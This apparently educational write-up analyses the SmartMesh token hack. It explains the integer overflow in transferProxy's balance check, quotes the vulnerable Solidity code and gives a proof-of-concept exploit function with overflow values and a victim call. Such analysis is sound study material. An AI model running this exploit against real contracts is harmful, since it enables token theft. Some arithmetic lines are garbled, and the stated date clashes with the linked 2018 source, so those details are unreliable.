# SmartMesh


## Amount stolen
**$140M USD**

March 9,2021

## Vulnerability
Arithmetic overflow

## Analysis
The exploiter leveraged an arithmetic overflow vulnerability in the user balance check. The critical code snippet is:

```
if(balances[_from] < _feeSmt + _value) revert();
```

This condition is meant to ensure that a user's balance (balances[_from]) is sufficient to cover both the transfer amount (_value) and the associated fee (_feeSmt). 
However, this check can be bypassed using carefully chosen values that cause an overflow.

Consider the following values for _value and _feeSmt:

```
uint256 _value = uint256(0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
uint256 _feeSmt = uint256(0x7000000000000000000000000000000000000000000000000000000000000001);
```

These hexadecimal numbers are extremely large. When added together, they exceed the maximum value that a uint256 can hold (i.e., 2^256 -1) The addition of these numbers results in an overflow:

ox8fffff + 0x700

Since this result exceeds the uint256 limit, it wraps around due to overflow and the effective sum becomes:

ox10ffffffff = 0

In this context, the sum of _feeSmt and _value causes an overflow and effectively becomes zero. This makes the condition:

```
if (balances[_from] < 0) revert();
```

Since no balance can be less than zero, the check is bypassed, allowing the user to proceed with the transaction regardless of their actual balance.


This oversight in handling arithmetic overflow enables the attacker to transfer an unlimited amount of tokens

### Exploited code

```  
    /*
     * Proxy transfer SmartMesh token. When some users of the ethereum account has no ether,
     * he or she can authorize the agent for broadcast transactions, and agents may charge agency fees
     * @param _from
     * @param _to
     * @param _value
     * @param feeSmt
     * @param _v
     * @param _r
     * @param _s
     */
    function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt,
        uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){

        if(balances[_from] < _feeSmt + _value) revert();

        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce);
        if(_from != ecrecover(h,_v,_r,_s)) revert();

        if(balances[_to] + _value < balances[_to]
            || balances[msg.sender] + _feeSmt < balances[msg.sender]) revert();
        balances[_to] += _value;
        Transfer(_from, _to, _value);

        balances[msg.sender] += _feeSmt;
        Transfer(_from, msg.sender, _feeSmt);

        balances[_from] -= _value + _feeSmt;
        nonces[_from] = nonce + 1;
        return true;
    }
```

# Proof of concept (PoC) 

To demonstrate the arithmetic overflow vulnerability, we can exploit the balance check by using specific overflow values for _value and _feeSmt. Here’s how this can be executed:

##Initial State:

###Balances:
```
balances[_from] (address 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F) had a balance of 0 tokens.
balances[_to] (address 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F) had a balance of 0 tokens.
balances[msg.sender] (address 0xD6A09BD01B74fF1eD94d9Cc71f7CE2B8Bd646aF7) had a balance of 0 tokens.
```

###Exploit Parameters:
```
_value is set to 0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.
_feeSmt is set to 0x7000000000000000000000000000000000000000000000000000000000000001.
```

These values, when added, exceed the uint256 maximum value, causing an overflow which results in the effective sum being zero.

### Exploit Function
The following Solidity function demonstrates how the exploit can be performed:

```
function testExploit() public balanceLog {
        address _from = 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F;
        address _to = 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F;
        uint256 _value = uint256(0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint256 _feeSmt = uint256(0x7000000000000000000000000000000000000000000000000000000000000001);
        uint8 _v = uint8(0x000000000000000000000000000000000000000000000000000000000000001b);
        bytes32 _r = 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799;
        bytes32 _s = 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8;
        ISmartMesh(Victim).transferProxy(
            _from,
            _to,
            _value,
            _feeSmt,
            _v,
            _r,
            _s
        );
    }

```

**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2018-04/SmartMesh_exp.sol)




[**< Back**](https://patronasxdxd.github.io/CTFS/)
